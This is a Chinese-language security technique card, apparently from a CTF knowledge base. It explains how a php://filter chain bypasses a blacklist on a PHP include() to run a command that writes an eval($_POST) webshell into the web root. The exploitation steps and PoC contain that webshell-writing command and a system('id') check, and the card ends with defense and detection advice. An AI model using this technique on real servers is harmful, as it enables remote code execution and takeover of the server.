---
id: web-php-file-inclusion-filter-chain-exec-write-webshell
title: include($path) 黑名单漏掉 php://filter：用 filter chain 在包含点执行 echo base64|base64 -d > shell.php 落 webshell
type: scenario
domain: web
path: web/php/file-inclusion
technique: php-filter-chain-include-exec-write-webshell
aliases:
- include 点 php filter chain 写马
- php 链子去空格
- filter chain echo base64 -d 写文件
- 黑名单未拦 php://filter
- CTF include 写 webshell
tags:
- php
- file-inclusion
- php-filter
- filter-chain
- webshell
- waf-bypass
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:53:08+08:00'
  notes: 已对照原文核对；本次核对未读取图片；guest.php 黑名单正则（../、php://tmp、string|iconv|base|rot|IS|data|text|plain|decode|...）、include(\) sink、filter chain 生成器（creat_rce_chain.php/creat_payload.py）+ 去空格 + URL 编码、命令 echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOzs/Pg==|base64 -d>/var/www/html/1.php 均与正文一致；该 base64 实际解码为 <?php eval(\[1]);;?>（多一个分号，不影响利用），卡内写作 <?php eval(\[1]);?> 属轻微不精确。与本篇另一卡（%25 单字符编码绕过读源码，已由 filter-name-partial-urlencode-bypass 收）不重复；与 filter-chain-fileless-rce / filter-chain-file-write-webshell 属同一原语的不同落地（sink 与最终命令形态不同），保留。未验证点：写马成功与提权结果仅见于截图；PoC 未复跑；CTF 题无组件版本。
---

## 一句话结论

`include($_GET['path'])` 前只对 `../`、`php://tmp`、若干编码器关键字做正则黑名单时，`php://filter/.../resource=php://temp` 这类链式过滤器仍能通过；用 filter chain 生成器把「任意一条 shell 命令」编码成一串 `convert.iconv.*`/`convert.base64-decode` 组合，就能让 `include` 本身执行该命令，从而用 `echo <base64> | base64 -d > /var/www/html/1.php` 直接落一个 webshell。

## 原理

- **include 会实例化流**：`include($path)` 对 `php://filter` 这类 wrapper 同样按流打开，链上过滤器依次处理 `resource` 指定的底层数据，最终把字节流当 PHP 代码编译执行。也就是说「过滤器链的输出」等于「被包含的代码」。
- **filter chain 的构造原理**：`convert.iconv.X.Y` 能把输入字节按字符集转换表映射成另一串字节，`convert.base64-decode` 把可打印字符还原成任意字节。把若干 iconv 往返（`UTF8.CP1399` 之类产生特定前缀）与 base64-decode 串起来，就能从空流「合成」任意字节串——包括 `system('...');` 这样的 PHP 代码。
- **黑名单为什么拦不住**：正则里枚举的是 `php://tmp`、`string`、`iconv`、`base64`、`decode`、`quoted`、`zlib` 等关键字，但链式 payload 的形态是 `php://filter/convert.iconv.xxx/convert.base64-decode/resource=php://temp`，关键字是否命中只取决于具体拼写（大小写、后缀、是否被拆到另一段过滤器名），只要链里不出现被枚举的子串就能通过；`..`、`.` 之类限制也只作用于路径穿越，与流包装器无关。
- **为什么用 echo 写马而不是直接执行**：filter chain 长度随命令长度增长，直接在链里跑交互命令很脆弱；先用 `echo <base64>|base64 -d>文件` 落一个正常 webshell，后续交互就走普通请求，稳定且可复用。
- 生成器（CTF 常见脚本）就是把「目标命令」当输入，输出一串过滤器名；实际使用时去掉空格/换行（URL 里空格与换行会破坏链），再整体 URL 编码。

## 触发条件

- 存在用户可控的 `include`/`require`/`file_get_contents` 等接受流包装器的文件操作。
- 未禁用 `php://filter`（未设置 `allow_url_include=Off` 之外还保留 filter），且过滤器链未被白名单限制（只允许固定目录或固定后缀）。
- 黑名单式过滤，未枚举完整过滤器名/未阻止 `resource=` 指向 `php://temp`、`data:`、`php://memory` 等空流。
- 目标可写目录（如 web 根）可被 PHP 进程写入，才能落地 webshell。

## 利用步骤

1. 确认包含点：`?path=/tmp/hello.php` 能正常包含默认文件，说明 `include` 可控。
2. 测黑名单边界：提交 `php://filter/convert.base64-decode/resource=php://temp` 之类，观察是否被 `Don't do this` 拦住；未被拦说明链式过滤器可用。
3. 用 filter chain 生成器把命令编码成链：命令取 `echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOzs/Pg==|base64 -d>/var/www/html/1.php`（base64 内容即 `<?php eval($_POST[1]);?>`）。
4. 去掉链里的空白字符，整条 URL 编码后放进 `path` 参数提交，`include` 执行该命令并在 web 根写出 `1.php`。
5. 访问 `1.php`，POST `1=system('id');` 验证 webshell 生效，再继续读 flag/提权。

PoC（请求形态）：

```http
GET /guest.php?path=php://filter/<generated-chain>/resource=php://temp HTTP/1.1
Host: <target>
```

其中生成链对应的命令为：

```bash
echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOzs/Pg==|base64 -d>/var/www/html/1.php
```

## 变体与关联

- **落地变体**：写到 `/var/www/html`、`/tmp`（配合 LFI 再包含）、图片目录（配合解析漏洞）均可。
- **内容变体**：链输出可直接是 `<?php system($_GET[0]);?>`，省掉二次 base64，但链更长更易被长度/WAF 拦。
- **入口变体**：`include`、`require`、`file_get_contents`、`file_put_contents(file_get_contents(...))` 都是同一个原语；本卡与「filter chain 由空流生成任意字节」「file_put_contents 落 eval.php」两张既有卡是同一原语的不同落地方式，差异在于本卡的 sink 是 `include` 且命令形态是 `echo|base64 -d>文件`。
- **前置信息收集**：`?path=index.php`、`.index.php.swp` 等泄露源码的方式可先拿到黑名单，再据此选未被枚举的过滤器组合。
- **关联**：PHAR 反序列化、`data://`/`php://input` 直接包含、日志/会话文件包含。

## 检测与防御

- **白名单**：`include` 只允许固定目录下的固定后缀（`basename` 后比对），显式拒绝任何含 `://` 的输入。
- **禁用危险包装器**：`allow_url_include=Off`、必要时用 `stream_wrapper_unregister` 注销 `php`/`data`/`phar` 等；`open_basedir` 限制可读目录。
- **不要用黑名单**：过滤器名可无限组合，黑名单必然漏；改用「只允许字母数字文件名」的正则白名单。
- **检测**：审计日志中出现 `php://filter/convert.iconv`、超长 `path` 参数、请求中大量 `convert.` 片段即为典型 filter chain 攻击；同时监控 web 目录新增 `.php` 文件。
